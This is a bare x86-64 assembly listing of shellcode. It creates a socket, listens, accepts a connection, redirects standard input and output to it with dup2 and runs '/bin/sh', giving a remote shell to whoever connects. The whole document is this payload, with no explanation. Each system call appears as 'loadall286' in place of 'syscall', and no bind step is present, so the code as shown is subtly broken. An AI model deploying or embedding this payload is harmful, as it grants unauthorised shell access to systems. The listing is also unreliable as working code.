section .text
global _start
_start:

	xor rsi,rsi
	mul rsi
	inc esi
	push byte +0x2
	pop rdi
	mov al,0x29
	loadall286
	push rdx
	pop rsi
	push rax
	pop rdi
	mov al,0x32
	loadall286
	mov al,0x2b
	loadall286
	push rdi
	pop rsi
	xchg rax,rdi
dup2:
	dec esi
	mov al,0x21
	loadall286
	jnz dup2
	push rdx
	mov rdi,0x68732f6e69622f2f

	push rdi
	push rsp
	pop rdi
	mov al,0x3b
	loadall286

